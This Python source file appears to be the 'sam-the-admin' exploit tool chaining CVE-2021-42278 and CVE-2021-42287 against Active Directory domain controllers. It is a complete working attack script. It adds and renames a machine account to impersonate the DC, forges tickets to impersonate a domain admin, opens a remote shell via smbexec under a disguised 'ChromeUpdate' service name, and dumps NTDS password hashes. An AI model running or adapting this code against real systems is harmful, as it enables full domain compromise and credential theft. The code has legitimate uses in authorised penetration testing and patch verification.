#!/usr/bin/env python
#coding: utf-8
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_credentials


import argparse
import logging
import sys
import string
import random
import ssl
import os
from binascii import unhexlify
import ldapdomaindump
import ldap3
import time
import re

from utils.helper import *
from utils.addcomputer import AddComputerSAMR
from utils.S4U2self import GETST
from utils.smbexec import CMDEXEC
from utils.secretsdump import DumpSecrets

characters = list(string.ascii_letters + string.digits + "!@#$%^&*()")

def exploit(dcfull,adminticket,options):
    os.environ["KRB5CCNAME"] = adminticket
    if options.shell:
        try:
            executer = CMDEXEC('', '', domain, None, None, True, options.dc_ip,
                            options.mode, options.share, int(options.port), options.service_name, options.shell_type, options.codec)
            executer.run(dcfull, options.dc_ip)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
    if options.dump:
        try:
            options.k = True
            options.target_ip = options.dc_ip
            options.system = options.bootkey = options.security = options.system = options.ntds = options.sam = options.resumefile = None
            options.outputfile = 'secrets.txt'
            dumper = DumpSecrets(dcfull, '', '', domain, options)
            dumper.dump()
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))


def get_hash_from_secrets(username):
    with open('secrets.txt.ntds') as f:
        lines = f.readlines()
    
    for line in lines:
        admin_acc = re.search(r"(?:\S+)\\" + username + ":(?:\d+):(?:[0-9a-f]{32}):([0-9a-f]{32}):::", line)
        if admin_acc:
            hash = admin_acc.group(1)
            print(f'Admin Cred: {username}:{hash}')
            return username, hash
        

def getTGT(username, options, kdc, requestPAC=True):
    userName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    if options.hashes is not None:
        __lmhash, __nthash = options.hashes.split(':')
    else:
        __lmhash = __nthash = ''
    aesKey = ''
    if options.aesKey is not None:
        aesKey = options.aesKey
    try:
        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain,
                                                                unhexlify(__lmhash), unhexlify(__nthash), aesKey,
                                                                kdc, requestPAC=requestPAC)
        return tgt
    except Exception as e:
        logging.error(f"Error getting TGT, {e}")
        return None


def check_patch(username, options, kdc):
    # Patched DCs respond with PACs regardless, compare requests to check if DC is patched
    pac_tgt = getTGT(username, options, kdc, requestPAC=True)
    no_pac_tgt = getTGT(username, options, kdc, requestPAC=False)
    if pac_tgt and no_pac_tgt:
        print(f'[+] TGT with PAC: {len(pac_tgt)}')
        print(f'[+] TGT without PAC: {len(no_pac_tgt)}')
        if len(pac_tgt) == len(no_pac_tgt):
            print(f'[-] TGTs are same size, target {options.dc_ip} is patched')
            exit()
        else:
            print(f'[+] TGTs differ in size, target is not patched')
            return True
    else:
        print(f'[-] Failed requesting both TGTs to check patch status')
        exit()


def check_machine_account_quota(username, password, domain, lmhash, nthash, options):
    ldap_server, ldap_session = init_ldap_session(options, domain, username, password, lmhash, nthash)
    cnf = ldapdomaindump.domainDumpConfig()
    cnf.basepath = None
    domain_dumper = ldapdomaindump.domainDumper(ldap_server, ldap_session, cnf)
    MachineAccountQuota = 10
    for i in domain_dumper.getDomainPolicy():
        MachineAccountQuota = int(str(i['ms-DS-MachineAccountQuota']))

    if MachineAccountQuota < 1:
        print(f'[-] Cannot exploit. ms-DS-MachineAccountQuota: {MachineAccountQuota}')
        exit()
    else:
        print(f'[+] ms-DS-MachineAccountQuota: {MachineAccountQuota}')
        return domain_dumper


def check(username, password, domain, options):
    domain, username, password, lmhash, nthash = parse_identity(options)

    # Check if DC is patched
    check_patch(username, options, options.dc_ip)

    # Check machine account quota
    domain_dumper = check_machine_account_quota(username, password, domain, lmhash, nthash, options)

    return domain_dumper


def get_dc_hostname(ldap_session, domain_dumper, options):
    dcinfo = get_dc_host(ldap_session, domain_dumper, options)
    if len(dcinfo) == 0:
        print('[-] Failed retrieving domain info from LDAP')
        exit()

    for host, info in dcinfo.items():
        if info['HostIP'] == options.dc_ip:
            print(f'[+] Successfully queried LDAP for matching DC record: {host} {info["dNSHostName"]}')
            return host, info['dNSHostName']
    else:
        print(f'[-] Failed finding DC with matching IP {options.dc_ip}. {dcinfo}')
        exit()

def create_temp_account(username, password, domain, options, delete=False):
    # Generate temp computer name and password
    new_computer_name = ''.join(random.sample(string.ascii_letters + string.digits, 10)).upper()
    new_computer_password = ''.join(random.choice(characters) for _ in range(12))

    # Create Machine Account
    addmachineaccount = AddComputerSAMR(
        username,
        password,
        domain,
        options,
        computer_name=new_computer_name,
        computer_pass=new_computer_password)
    addmachineaccount.run(delete=delete)
    if not addmachineaccount._AddComputerSAMR__success:
        exit()

    print(f'[+] Successfully added temporary account: {new_computer_name}:{new_computer_password}')
    return new_computer_name, new_computer_password


def modify_temp_account(old_name, new_name, ldap_session, domain_dumper):
    dn = get_user_info(old_name, ldap_session, domain_dumper)
    ldap_session.modify(str(dn['dn']), {'sAMAccountName': [ldap3.MODIFY_REPLACE, [new_name]]})
    if ldap_session.result['result'] == 0:
        print(f'[+] Successfully modified sAMAccountName for {old_name} to {new_name}')
    else:
        print(f'[-] Failed to modify the machine account: {ldap_session.result["message"]}')
        exit()


def samtheadmin(username, password, domain, options):
    domain, username, password, lmhash, nthash = parse_identity(options)
    ldap_server, ldap_session = init_ldap_session(options, domain, username, password, lmhash, nthash)

    # Check if all conditions are met to be exploitable
    domain_dumper = check(username, password, domain, options)

    # Retrieve DC FQDN
    dc_host, dcfull = get_dc_hostname(ldap_session, domain_dumper, options)
    print(f'[+] Target is vulnerable! {options.dc_ip} -> {dcfull}')

    # Select an admin to impersonate
    domain_admins = get_domain_admins(ldap_session, domain_dumper)
    domain_admin = random.choice(domain_admins)
    adminticket = str(f'{domain_admin}_{dcfull}.ccache')
    print(f'[+] Impersonating {domain_admin}')

    # Create the computer account
    new_computer_name, new_computer_password = create_temp_account(username, password, domain, options)

    # Modify the computer account altName
    modify_temp_account(new_computer_name, dc_host, ldap_session, domain_dumper)
   
    # make hash none, we don't need id now.
    options.hashes = None
    
    # Getting a ticket
    getting_tgt = GETTGT(dc_host, new_computer_password, domain, options)
    getting_tgt.run()
    dcticket = str(dc_host + '.ccache')

    # Revert the changes to the computer account
    modify_temp_account(dc_host, new_computer_name, ldap_session, domain_dumper)
   
    os.environ["KRB5CCNAME"] = dcticket
    executer = GETST(None, None, domain, options, impersonate_target=domain_admin, target_spn=f"cifs/{dcfull}")
    executer.run()
    print(f'[+] Removing ccache of {dcfull}')
    os.remove(dcticket)
    print(f'[+] Renaming ccache with target')
    os.rename(f'{domain_admin}.ccache', adminticket)

    # Dump NTDS
    exploit(dcfull, adminticket, options)

    # Delete computer account
    password = None
    username, nthash = get_hash_from_secrets(domain_admin)
    options.k = None
    options.hashes = 'aad3b435b51404eeaad3b435b51404ee:' + nthash
    lmhash = 'aad3b435b51404eeaad3b435b51404ee'
    ldap_server, ldap_session = init_ldap_session(options, domain, username, password, lmhash, nthash)
    del_added_computer(ldap_session, domain_dumper, new_computer_name)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help = True, description = "SAM THE ADMIN CVE-2021-42278 + CVE-2021-42287 chain")

    parser.add_argument('account', action='store', metavar='[domain/]username[:password]', help='Account used to authenticate to DC.')
    parser.add_argument('--impersonate', action="store", help='target username that will be impersonated (thru S4U2Self)'
                                                              ' for quering the ST. Keep in mind this will only work if '
                                                              'the identity provided in this scripts is allowed for '
                                                              'delegation to the SPN specified')

    parser.add_argument('-domain-netbios', action='store', metavar='NETBIOSNAME', help='Domain NetBIOS name. Required if the DC has multiple domains.')
    parser.add_argument('-new-name', action='store', metavar='NEWNAME', help='Add new computer name, if not specified, will be random generated.')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-shell', action='store_true', help='Drop a shell via smbexec')
    parser.add_argument('-dump', action='store_true', help='Dump Hashs via secretsdump')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on account parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command '
                                                       'line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-dc-host', action='store',metavar = "hostname",  help='Hostname of the domain controller to use. '
                                                                              'If ommited, the domain part (FQDN) '
                                                                              'specified in the account parameter will be used')
    group.add_argument('-dc-ip', action='store',metavar = "ip",  help='IP of the domain controller to use. '
                                                                      'Useful if you can\'t translate the FQDN.'
                                                                      'specified in the account parameter will be used')
    parser.add_argument('-use-ldap', action='store_true', help='Use LDAP instead of LDAPS')


    exec =  parser.add_argument_group('execute options')
    exec.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')
    exec.add_argument('-mode', action='store', choices = {'SERVER','SHARE'}, default='SHARE',
                        help='mode to use (default SHARE, SERVER needs root!)')
    exec.add_argument('-share', action='store', default='ADMIN$', help='share where the output will be grabbed from (default ADMIN$)')
    exec.add_argument('-shell-type', action='store', default = 'cmd', choices = ['cmd', 'powershell'], help='choose '
                        'a command processor for the semi-interactive shell')
    exec.add_argument('-codec', action='store', default='GBK', help='Sets encoding used (codec) from the target\'s output (default "GBK").')
    exec.add_argument('-service-name', action='store', metavar="service_name", default = "ChromeUpdate", help='The name of the'
                                         'service used to trigger the payload')

    dumper =  parser.add_argument_group('dump options')
    dumper.add_argument('-just-dc-user', action='store', metavar='USERNAME',
                       help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
                            'Implies also -just-dc switch')
    dumper.add_argument('-just-dc', action='store_true', default=False,
                        help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
    dumper.add_argument('-just-dc-ntlm', action='store_true', default=False,
                       help='Extract only NTDS.DIT data (NTLM hashes only)')
    dumper.add_argument('-pwd-last-set', action='store_true', default=False,
                       help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
    dumper.add_argument('-user-status', action='store_true', default=False,
                        help='Display whether or not the user is disabled')
    dumper.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')
    dumper.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only '
                         'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
                         'state')
    dumper.add_argument('-use-vss', action='store_true', default=False,
                        help='Use the VSS method insead of default DRSUAPI')
    dumper.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
                        'method to use at target (only when using -use-vss). Default: smbexec')



    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password = parse_credentials(options.account)

    if options.just_dc_user is not None:
        if options.use_vss is True:
            logging.error('-just-dc-user switch is not supported in VSS mode')
            sys.exit(1)
        elif options.resumefile is not None:
            logging.error('resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch')
            sys.exit(1)
        else:
            # Having this switch on implies not asking for anything else.
            options.just_dc = True

    if options.use_vss is True and options.resumefile is not None:
        logging.error('resuming a previous NTDS.DIT dump session is not supported in VSS mode')
        sys.exit(1)

    try:
        if domain is None or domain == '':
            logging.error('Domain should be specified!')
            sys.exit(1)

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass
            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True


        samtheadmin(username, password, domain, options)
    except ldap3.core.exceptions.LDAPBindError as e:
        logging.error(f"Pls check your account. Error: {e}")
    except ldap3.core.exceptions.LDAPSocketOpenError as e:
         logging.error(f"If ssl error, add `-use-ldap` parameter to connect with ldap. Error: {e}")
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(e)

